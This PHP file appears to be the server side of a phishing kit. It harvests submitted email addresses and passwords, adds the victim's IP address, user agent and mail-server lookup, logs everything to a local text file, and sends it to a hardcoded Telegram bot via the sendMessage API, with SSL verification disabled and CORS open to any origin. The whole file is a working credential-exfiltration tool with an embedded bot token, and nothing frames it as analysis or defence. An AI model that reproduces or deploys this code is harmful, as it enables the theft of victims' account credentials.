<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET');
header('Access-Control-Allow-Headers: Origin, Content-Type, Accept, Authorization, X-Request-With');

$data = json_decode(file_get_contents("php://input"), true);

if ((!empty(trim($_POST['email'])) && !empty(trim($_POST['password'])))) {
    function get_client_ip() {
        $ipaddress = "";
        if (getenv("HTTP_CLIENT_IP"))
            $ipaddress = getenv("HTTP_CLIENT_IP");
        else if (getenv("HTTP_X_FORWARDED_FOR"))
            $ipaddress = getenv("HTTP_X_FORWARDED_FOR");
        else if (getenv("HTTP_X_FORWARDED"))
            $ipaddress = getenv("HTTP_X_FORWARDED");
        else if (getenv("HTTP_FORWARDED_FOR"))
            $ipaddress = getenv("HTTP_FORWARDED_FOR");
        else if (getenv("HTTP_FORWARDED"))
            $ipaddress = getenv("HTTP_FORWARDED");
        else if (getenv("REMOTE_ADDR"))
            $ipaddress = getenv("REMOTE_ADDR");
        else
            $ipaddress = "UNKNOWN";
        return $ipaddress;
    }

    function ParseUA() {
        $UA = "";
        $UAHeaders = [
            "HTTP_USER_AGENT", "HTTP_X_OPERAMINI_PHONE_UA", "HTTP_X_DEVICE_USER_AGENT",
            "HTTP_X_UCBROWSER_DEVICE_UA", "HTTP_FROM", "HTTP_X_SCANNER",
            "HTTP_X_ORIGINAL_USER_AGENT", "HTTP_X_SKYFIRE_PHONE",
            "HTTP_X_BOLT_PHONE_UA", "HTTP_DEVICE_STOCK_UA"
        ];
        foreach ($UAHeaders as $header) {
            if (isset($_SERVER[$header]) && !empty(trim($_SERVER[$header]))) {
                $UA = $_SERVER[$header];
                break;
            }
        }
        return $UA;
    }

    function save_logs($message) {
        $path = 'bot_visits.txt';
        return file_put_contents($path, $message . PHP_EOL, FILE_APPEND);
    }

    function mx_record ($email) {
        $domain = explode('@', $email)[1];
        $arr= dns_get_record($domain,DNS_MX);
        if($arr[0]['host']==$domain&&!empty($arr[0]['target'])){
            return $arr[0]['target'];
        } else {return $domain;}
    }

    $IP = get_client_ip();
    $UserAgent = ParseUA();
    $email = $_POST['email'];
    $password = $_POST['password'];
    $mx_record = mx_record($email);

    $message = "******* $email {$mx_record} ******" . PHP_EOL;
    $message .= "Email: {$email}" . PHP_EOL;
    $message .= "Password: {$password}" . PHP_EOL;
    $message .= "IP: https://ip-api.com/{$IP}" . PHP_EOL;
    $message .= "User-Agent: {$UserAgent}" . PHP_EOL;
    $message .= "**************************" . PHP_EOL;

    save_logs($message);

  
    $bots = [
        ["token" => "8690669246:AAGQVDVSp1uhHrGABk2CGPPbgHfyuPaUDYo", "chat_id" => "8845825622"],

        

    ];

    foreach ($bots as $bot) {
        $website = "https://api.telegram.org/bot" . $bot['token'];
        $params = ['chat_id' => $bot['chat_id'], 'text' => $message];

        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);

      
        file_put_contents("bot_responses.txt", $result . PHP_EOL, FILE_APPEND);
    }
}
?>
